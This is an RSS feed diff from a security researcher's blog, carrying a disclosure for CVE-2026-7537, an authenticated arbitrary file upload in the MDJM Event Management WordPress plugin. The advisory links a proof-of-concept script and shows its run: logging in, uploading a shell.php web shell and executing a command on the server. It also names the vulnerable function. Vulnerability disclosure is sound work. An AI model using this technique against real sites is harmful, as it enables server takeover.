@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+	<channel>
+		<title>MDJM Event Management on </title>
+		<link>https://ryankozak.com/tags/mdjm-event-management/</link>
+		<description>Recent content in MDJM Event Management on </description>
+		<generator>Hugo</generator>
+		<language>en-us</language>
+		
+		
+		
+		
+			<lastBuildDate>Fri, 05 Jun 2026 00:01:00 +0000</lastBuildDate>
+		
+			<atom:link href="https://ryankozak.com/tags/mdjm-event-management/index.xml" rel="self" type="application/rss+xml" />
+			<item>
+				<title>MDJM Event Management &lt;= 1.7.8.3 - Authenticated (Administrator&#43;) Arbitrary File Upload via mdjm_email_upload_file Parameter</title>
+				<link>https://ryankozak.com/posts/cve-2026-7537/</link>
+				<pubDate>Fri, 05 Jun 2026 00:01:00 +0000</pubDate>
+				<guid>https://ryankozak.com/posts/cve-2026-7537/</guid>
+				<description>&lt;h3 id=&#34;cve-2026-7537&#34;&gt;CVE-2026-7537&lt;/h3&gt;&#xA;&lt;p&gt;The WordPress &lt;a href=&#34;https://wordpress.org/plugins/mobile-dj-manager/&#34; target=&#34;_blank&#34;&gt;MDJM Event Management&lt;/a&gt; plugin (version 1.7.8.3 and prior) contains an arbitrary file upload vulnerability that allows authenticated administrators to upload malicious PHP files to the server, potentially leading to remote code execution.&lt;/p&gt;&#xA;&lt;h2 id=&#34;tldr-exploits&#34;&gt;TL;DR Exploits&lt;/h2&gt;&#xA;&lt;p&gt;A POC &lt;a href=&#34;https://github.com/d0n601/CVE-2026-7537/blob/master/CVE-2026-7537.py&#34; target=&#34;_blank&#34;&gt;CVE-2026-7537.py&lt;/a&gt; is provided to demonstrate an authenticated attacker uploading shell.php and executing remote code:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 ./CVE-2026-7537.py http://target-site.com admin password123&#xA;[+] Logging into: http://target-site.com/wp-admin&#xA;[+] Extracting nonce values...&#xA;[+] Uploading web shell: shell.php&#xA;[+] Web Shell Location: http://target-site.com/wp-content/uploads/2026/02/shell.php&#xA;[+]&#xA;[+] Executing test command: id&#xA;uid=33(www-data) gid=33(www-data) groups=33(www-data)&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;technical-description&#34;&gt;Technical Description&lt;/h2&gt;&#xA;&lt;p&gt;The vulnerability exists in the &lt;code&gt;mdjm_send_comm_email()&lt;/code&gt; function in the communications feature. The upload functionality lacks proper file validation while processing file attachments for email communications. This allows authenticated users with the &lt;code&gt;mdjm_comms_send&lt;/code&gt; capability (administrators and MDJM admins by default) to upload arbitrary files, including PHP files that can be executed on the server.&lt;/p&gt;</description>
+			</item>
+	</channel>
+</rss>
